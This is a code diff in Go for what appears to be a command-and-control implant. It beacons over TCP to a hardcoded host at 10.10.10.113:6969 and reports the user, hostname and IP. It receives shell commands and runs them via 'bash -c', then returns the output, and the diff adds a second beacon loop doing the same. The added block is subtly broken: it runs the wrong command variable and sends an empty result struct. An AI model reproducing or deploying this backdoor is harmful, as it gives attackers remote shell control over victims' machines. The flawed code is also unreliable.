@@ -56,21 +56,14 @@ func main() {
 		destruct := types.GiveServerResult{}
 		if CommandType == "shell" && Command != "" {
 			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
-			// tokens := strings.Split(message1, " ")
 			var c *exec.Cmd
 			c = exec.Command("bash", "-c", Command)
-			// if len(tokens) == 1 {
-			// 	c = exec.Command(tokens[0])
-			// } else {
-			// 	c = exec.Command(tokens[0], tokens[1:]...)
-			// }
 			buf, _ := c.CombinedOutput()
 			if err != nil {
 				CmdOut = err.Error()
 			}
 			CmdOut += string(buf)
 			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
-			// beacon.Write(buf)
 			destruct = types.GiveServerResult{
 				Uuid:        instruct.UpdateAgentConfig.Uuid,
 				Result:      "1",
@@ -96,6 +89,71 @@ func main() {
 		// 	continue
 		// }
 		beacon.Close()
+		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
+		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
+
+		keybeacon, err := net.Dial("tcp", "10.10.10.113:6969")
+		if err != nil {
+			log.Fatalln(err) // maybe try diff IP
+		}
+		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
+		keyip := fmt.Sprintf("%v", keyipAddress)
+		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip
+		// logger.Logf(logger.Debug, "Sending : %s\n", init)
+		// fmt.Fprintf(beacon, "12344\n")
+		_, _ = keybeacon.Write([]byte(keyinit + "\n")) // add Ip,user and hostname
+		// text, _ := bufio.NewReader(beacon).ReadString('\n')
+		// message := strings.Split(text, "\n")
+		// if message[0] == "Yes" {
+		keydec := gob.NewDecoder(keybeacon)
+		keyencoder := gob.NewEncoder(keybeacon)
+		logger.Logf(logger.Info, "Server Connected\n")
+		keyinstruct := &types.GiveAgentCommand{}
+		logger.Logf(logger.Debug, "Struct formed\n")
+		err = keydec.Decode(keyinstruct)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		logger.Logf(logger.Debug, "Received : %s\n", keyinstruct)
+		KeyCommandType := keyinstruct.CommandType
+		KeyCommand := keyinstruct.Command
+		KeyCmdOut := ""
+		Keydestruct := types.GiveServerResult{}
+		if KeyCommandType == "shell" && KeyCommand != "" {
+			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
+			var c *exec.Cmd
+			c = exec.Command("bash", "-c", Command)
+			buf, _ := c.CombinedOutput()
+			if err != nil {
+				KeyCmdOut = err.Error()
+			}
+			KeyCmdOut += string(buf)
+			logger.Logf(logger.Done, "Command executed successfully : %s\n", KeyCmdOut)
+			destruct = types.GiveServerResult{
+				Uuid:        keyinstruct.UpdateAgentConfig.Uuid,
+				Result:      "1",
+				Output:      KeyCmdOut,
+				CommandUUID: keyinstruct.CommandUUID,
+			}
+		} else { // if CommandType == ""
+			destruct = types.GiveServerResult{
+				Uuid:        keyinstruct.UpdateAgentConfig.Uuid,
+				Result:      "2", // meaning nothing to run
+				Output:      "",
+				CommandUUID: keyinstruct.CommandUUID,
+			}
+		}
+
+		err = keyencoder.Encode(Keydestruct)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		logger.Logf(logger.Debug, "Sent encoded struct\n")
+		// } else {
+		// 	logger.Logf(logger.Debug, "No Auth\n")
+		// 	continue
+		// }
+		keybeacon.Close()
 		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
 		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
 	}
